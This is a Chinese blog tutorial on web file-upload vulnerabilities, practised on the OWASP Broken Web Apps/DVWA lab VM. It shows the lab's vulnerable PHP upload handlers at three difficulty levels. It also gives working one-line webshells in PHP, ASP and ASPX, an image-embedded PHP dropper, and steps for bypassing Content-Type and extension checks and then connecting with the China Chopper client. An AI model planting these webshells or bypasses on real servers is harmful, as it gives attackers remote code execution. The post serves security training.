<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Web文件包含上传漏洞 | 秋子熙驿站</title><meta name="author" content="Chozimer"><meta name="copyright" content="Chozimer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言本文章以实际环境OWASP TOP 10 为主，所有的渗透测试都基于该靶机，所以额外需要其他配置的漏洞的网页源码，本网站只能提供理论（或者等我后期搭建好了环境有空来进行填坑），以及本文章注重理论外加实际操作，以上完毕。 Web文件包含上传入门：文件上传漏洞是什么？文件上传（File Upload)是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。 上传文件时，如果服务端代码">
<meta property="og:type" content="article">
<meta property="og:title" content="Web文件包含上传漏洞">
<meta property="og:url" content="https://chozimer.github.io/2021/04/21/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="秋子熙驿站">
<meta property="og:description" content="前言本文章以实际环境OWASP TOP 10 为主，所有的渗透测试都基于该靶机，所以额外需要其他配置的漏洞的网页源码，本网站只能提供理论（或者等我后期搭建好了环境有空来进行填坑），以及本文章注重理论外加实际操作，以上完毕。 Web文件包含上传入门：文件上传漏洞是什么？文件上传（File Upload)是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。 上传文件时，如果服务端代码">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-04-21T10:42:49.000Z">
<meta property="article:modified_time" content="2021-04-27T01:37:02.923Z">
<meta property="article:author" content="Chozimer">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://chozimer.github.io/2021/04/21/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-27 09:37:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">秋子熙驿站</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web文件包含上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-21T10:42:49.000Z" title="发表于 2021-04-21 18:42:49">2021-04-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-27T01:37:02.923Z" title="更新于 2021-04-27 09:37:02">2021-04-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Web文件包含上传漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章以实际环境OWASP TOP 10 为主，所有的渗透测试都基于该靶机，所以额外需要其他配置的漏洞的网页源码，本网站只能提供理论（或者等我后期搭建好了环境有空来进行填坑），以及本文章注重理论外加实际操作，以上完毕。</p>
<h2 id="Web文件包含上传入门："><a href="#Web文件包含上传入门：" class="headerlink" title="Web文件包含上传入门："></a>Web文件包含上传入门：</h2><h3 id="文件上传漏洞是什么？"><a href="#文件上传漏洞是什么？" class="headerlink" title="文件上传漏洞是什么？"></a>文件上传漏洞是什么？</h3><p>文件上传（File Upload)是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。</p>
<p>上传文件时，如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、 jsp等格式的文件)。</p>
<h3 id="搭建OWASP靶场"><a href="#搭建OWASP靶场" class="headerlink" title="搭建OWASP靶场"></a>搭建OWASP靶场</h3><p>我的主要的实验都是在OWASP，所以我们下载<a target="_blank" rel="noopener" href="https://jaist.dl.sourceforge.net/project/owaspbwa/1.2/OWASP_Broken_Web_Apps_VM_1.2.7z">OWASP</a>搭建靶场,下载好之后，解压压缩包文件，添加到虚拟机，我们就可以正常的运行了。</p>
<h3 id="简单的上传一句话木马"><a href="#简单的上传一句话木马" class="headerlink" title="简单的上传一句话木马"></a>简单的上传一句话木马</h3><h4 id="网页源码分析"><a href="#网页源码分析" class="headerlink" title="网页源码分析"></a>网页源码分析</h4><p>我们在前台查看网页源代码的时候，只看到两个函数，一个用来选中上传的文件，另一个用来进行上传，我们查看不到网页的过滤信息。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们来查看OWASP低级别的时候网页后端源代码的构造，可以看到我们的网页对所有的文件都是没有做任何的限制的，所以这样我们就很容易被不法分子进行入侵,所以我们就可以将我们的一句话木马进行</p>
<h4 id="一句话木马构造"><a href="#一句话木马构造" class="headerlink" title="一句话木马构造"></a>一句话木马构造</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个一句话木马的构造很简单，我们主要利用的是PHP语言中的eval函数，我们可以看下官网文档中对这个函数的描述：</p>
<p>CautionThe eval() language construct is very dangerous because it allows execution of arbitrary PHP code. Its use thus is discouraged. If you have carefully verified that there is no other option than to use this construct, pay special attention not to pass any user provided data* into it without properly validating it beforehand.</p>
<p>翻译：警告eval（）语言结构非常危险，因为它允许执行任意PHP代码。 因此不鼓励使用它。 如果您已经仔细验证了除了使用此构造之外没有其他选择，请特别注意不要在未事先正确验证的情况下将任何用户提供的数据传递给该构造。</p>
<p>所以我做了一张图来描述这一句话木马在黑入服务器后，我们利用他来进行的一系列操作：</p>
<p>​    1、黑客如果想执行‘echo get_current_user();’命令来获取现在运行的用户</p>
<p>​    2、黑客就要将这句命令赋值到‘Hacker’字段里面，成为‘Hacker=echo get_current_user();’</p>
<p>​    3、服务器就会将上面的字段中的命令通过‘POST’的方法，使用‘eval’函数来调用我们的命令</p>
<img src="https://raw.githubusercontent.com/Chozimer/picture/main/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86.png" alt="avatar" style="zoom:67%;" />

<p>我们用一个实例来进行演示我们上面的过程：</p>
<p>1、我们在本地新建一个一句话木马文件</p>
<img src="https://raw.githubusercontent.com/Chozimer/picture/main/Web文件包含上传漏洞/php.png" alt="avater"  />

<p>2、我们打开OWASP网页，设置OWASP TOP 10 选中 “文件上传漏洞”,并且将难度设置为低(Ps：懒得重新截图了，就将就一下吧)</p>
<img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%8D%A2%E9%9A%BE%E5%BA%A6.png?raw=true" alt="avater"  />

<p>3、将我们的木马上传到服务器后，网页回显了‘成功’以及’木马路径‘的信息</p>
<img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/low-%E9%80%89%E7%9D%80%E6%9C%A8%E9%A9%AC.png?raw=true" alt="avater"  />

<img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/low-%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.png?raw=true" alt="avater"  />





<p>4、我们将网页上面的注释符号删除，将上传成功的’木马路径信息‘拼凑在网页链接后面，然后回车我们就可以看到我们的木马文件（网页显示为空白是因为服务器已经将我们的一句话木马用PHP进行解析了，但是由于’hacker‘字段里面没有任何的内容，所以才显示为空白）</p>
<img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%8B%BC%E5%87%91url.png?raw=true" alt="avater"  />

<img src="https://raw.githubusercontent.com/Chozimer/picture/main/Web文件包含上传漏洞/low木马路径.png" alt="avater"  />

<p>5、我们打开Win10系统内置cmd，来使用curl命令来构造一个对我们木马文件进行POST请求，来进行利用我们的木马文件，可以看到回复运行用户是www-data,说明我们的一句话木马已经成功利用了。</p>
<img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/low%E7%9A%84%E5%88%A9%E7%94%A8.png?raw=true" alt="avater"  />



<h4 id="一句话木马的各种类型"><a href="#一句话木马的各种类型" class="headerlink" title="一句话木马的各种类型"></a>一句话木马的各种类型</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php类型一句话木马：<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">asp类型一句话木马：&lt;% execute(request(<span class="string">&quot;hacker&quot;</span>)) %&gt;   </span><br><span class="line">aspx类型一句话木马：&lt;%@ Page Language=<span class="string">&quot;hacker&quot;</span> %&gt; &lt;% <span class="keyword">eval</span>(Request.Item[<span class="string">&quot;value&quot;</span>]) %&gt;</span><br><span class="line">补充：图片类型一句话木马：<span class="meta">&lt;?php</span> fputs( fopen(<span class="string">&#x27;hacker.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) , <span class="string">&#x27;&lt;? php eval($_POST[hacaker]) ?&gt;&#x27;</span> ) ; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="Web文件包含上传进阶："><a href="#Web文件包含上传进阶：" class="headerlink" title="Web文件包含上传进阶："></a>Web文件包含上传进阶：</h2><h4 id="网页源代码分析"><a href="#网页源代码分析" class="headerlink" title="网页源代码分析"></a>网页源代码分析</h4><p>我们可以看到，网页后端源代码中，是通过Content-Type的值来判断文件的类型，如果为图片类型则上传，如果不是则丢弃，那么就存在被绕过的可能，因为Content-Type的值是通过客户端传递的（和删除Javascript验证一样的思路），是可以任意修改的。所以当上传一个php文件时,在Burp Suite中将Content-Type修改为image/jpeg，就可以绕过服务端的检测。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">			<span class="comment">##如果上传的类型不是image/jpeg则丢弃</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="实际渗透操作："><a href="#实际渗透操作：" class="headerlink" title="实际渗透操作："></a>实际渗透操作：</h4><p>1、我们打开OWASP网页，设置OWASP TOP 10 选中 “文件上传漏洞”,并且将难度设置为中</p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%8D%A2%E9%9A%BE%E5%BA%A6.png?raw=true" alt="avater"></p>
<p>2、然后进行设置brup来进行抓包，可以看到我们发往服务器数据包里面带有一个‘类型’的字段，说明验证类型是检查是否是图片类型</p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/medium-burp%E6%8A%93.png?raw=true" alt="avater"></p>
<p>3、我们将Content-Typede的值改为image/jpeg，然后进行转发给服务器</p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/medium-%E8%BF%9B%E8%A1%8C%E8%BD%AC%E5%8F%91.png?raw=true" alt="avater"></p>
<p>4、网页回显上传成功，这个时候我们可以用菜刀进行连接，来帮助我们完成更多的操作</p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/medium-%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.png?raw=true" alt="avater"></p>
<p>5、打开我们的菜刀软件,选着添加，填入一句话木马的地址，和自定义的‘字段名称’，即可选着添加了</p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E8%8F%9C%E5%88%80%E6%B7%BB%E5%8A%A0.png?raw=true" alt="avater"></p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5.png?raw=true" alt="avater"></p>
<p>6、双击进入我们刚才添加了的一句话木马的url地址，选着更新缓存（只是为了网速太慢连接时候，刷新会快点），即可获取到运行网页的用户权限，我们已经创了几个test的目录了，说明我们一句话木马利用成功。</p>
<p><img src="https://github.com/Chozimer/picture/blob/main/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A52.png?raw=true" alt="avater">                                                                                                            </p>
<h2 id="Web文件包含上传高阶："><a href="#Web文件包含上传高阶：" class="headerlink" title="Web文件包含上传高阶："></a>Web文件包含上传高阶：</h2><h4 id="网页源代码分析："><a href="#网页源代码分析：" class="headerlink" title="网页源代码分析："></a>网页源代码分析：</h4><p>我们可以看到网页上传中上传的文件的后缀名称如果不符合jpg、JPG、jpeg、JPEG，且大小要小于100000字节，启用了白名单过滤方式，这样服务器就不存在客户端绕过的漏洞了，这个时候我们就要图片木马出场了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_ext</span> = substr(<span class="variable">$uploaded_name</span>, strrpos(<span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPG&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpeg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPEG&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line">			<span class="comment">##如果上传的文件后缀名称与以上的后缀名称不匹配则丢弃</span></span><br><span class="line">                <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="图片木马构造解析："><a href="#图片木马构造解析：" class="headerlink" title="图片木马构造解析："></a>图片木马构造解析：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;hacker.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;? php @eval($_POST[hacer]) ?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>图片木马的构造除了比较长以外并不难，我们主要是利用’fputs()’函数，来生成一个hacker.php文件，并且文件中保函了我们的一句话木马（温馨提示：创建木马的时候调用的是网页运行的Apache用户的权限，所以创建成功的时候会在我们网站的根目录下面，并不会和我们图片是同一路径）</p>
